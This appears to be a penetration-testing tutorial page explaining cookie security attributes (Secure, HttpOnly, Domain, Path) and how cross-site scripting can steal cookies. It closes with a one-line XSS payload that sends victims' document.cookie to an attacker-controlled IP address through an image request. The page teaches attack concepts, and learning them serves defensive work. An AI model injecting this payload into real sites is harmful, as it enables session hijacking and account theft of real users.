---
description: Leveraging XSS to steal client secrets and information
---

# Stealing Cookies and Session Information

One can use XSS to **steal cookies and session information** if the application uses an insecure session management configuration.&#x20;

## Stealing Cookies

Websites use [cookies](https://en.wikipedia.org/wiki/HTTP\_cookie) to track state and information about the user.

### Cookie Attributes

Cookies can be set with a variety of optional attributes including several that are potentially interesting to attackers

#### `Secure`

Instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

#### `HttpOnly`

Instructs the browser to deny JavaScript access to the cookie. If this flag is not set, one can use an XSS payload to steal the cookie

* Even if this flag is not set, one must work around some other browser controls because browser security dictates that cookies set by one domain cannot be sent directly to another domain

#### `Domain` and `Path`

Defines the scope of the cookie. Essentially tells the browser what website the cookie belongs to

For security reasons, cookies can only be set on the current resource's top domain and its subdomains, and not for another domain and its subdomains

* E.g. `example.com` cannot set a cookie with the domain of `foo.com` or any of its subdomains

If a cookie's `Domain` and `Path` attributes are not specified by the server, they default to the domain and path of the resource that was requested.

Below is an example of some `Set-Cookie` header fields in the HTTP response of a website after a user logged in. The HTTP request was sent to a webpage within the `docs.foo.com` subdomain:

```http
HTTP/1.0 200 OK
Set-Cookie: LSID=DQAAAK…Eaem_vYg; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
Set-Cookie: HSID=AYQEVn…DKrdst; Domain=.foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; HttpOnly
Set-Cookie: SSID=Ap4P…GTEq; Domain=foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
…
```

### XSS Cookie Hijacking

XSS can be used to steal cookies in the background of sessions.

For example, one could embed an XSS payload that would generate an "image" request to a server under the attacker's control. Included as a parameter of the request is the victim's cookie(s).

```html
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

This would cause any user whose browser loaded that image to also dump their cookies to the attacker's server (`10.11.0.4`).

